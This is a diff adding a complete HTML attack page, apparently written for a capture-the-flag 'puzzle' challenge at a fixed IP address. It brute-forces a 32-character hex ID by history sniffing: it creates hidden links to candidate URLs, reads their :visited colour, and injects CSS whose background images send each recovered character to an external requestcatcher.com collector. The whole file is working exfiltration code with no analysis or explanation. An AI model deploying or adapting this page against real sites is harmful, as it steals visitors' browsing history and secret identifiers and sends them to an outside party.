@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8">
+  <title>CSS Leak</title>
+  <style>
+    .checklink {
+      color: black;
+    }
+    .checklink:visited {
+      color: red;
+    }
+  </style>
+</head>
+<body>
+  <h1>Leak in progress…</h1>
+  <pre id="log"></pre>
+
+  <script>
+  (async () => {
+    const BASE = "http://34.146.134.179:3000/puzzle?id=";
+    const LEAK = "https://singetu0096.requestcatcher.com";
+    const HEX  = "0123456789abcdef".split("");
+    const MAX_POS = 32;
+
+    let prefix = "";
+    const logEl = document.getElementById("log");
+
+    for (let pos = 0; pos < MAX_POS; pos++) {
+      let found = null;
+
+      const style = document.createElement("style");
+      style.id = "leak-style";
+      style.textContent = HEX.map(c => {
+        return `
+a[href^="${BASE}${prefix}${c}"]:visited::after {
+  content: '';
+  display: block;
+  width: 1px; height: 1px;
+  background-image: url("${LEAK}?pos=${pos}&hex=${c}");
+}`;
+      }).join("\n");
+      document.head.appendChild(style);
+
+      for (const c of HEX) {
+        const a = document.createElement("a");
+        a.href = BASE + prefix + c;
+        a.className = "checklink";
+        a.textContent = `[pos=${pos}] try=${c}`;
+        a.style.position = "absolute";
+        a.style.left = "-9999px";
+        document.body.appendChild(a);
+
+        const color = getComputedStyle(a).color;
+        document.body.removeChild(a);
+
+        if (color === "rgb(255, 0, 0)") {
+          found = c;
+          logEl.textContent += `pos ${pos} → ${c}\n`;
+          break;
+        }
+        await new Promise(r => setTimeout(r, 20));
+      }
+
+      document.head.removeChild(style);
+
+      if (found === null) {
+        logEl.textContent += `pos ${pos} → (no match)\n`;
+        break;
+      }
+      prefix += found;
+    }
+
+    logEl.textContent += `\nRecovered ID prefix: ${prefix}\n`;
+  })();
+  </script>
+</body>
+</html>
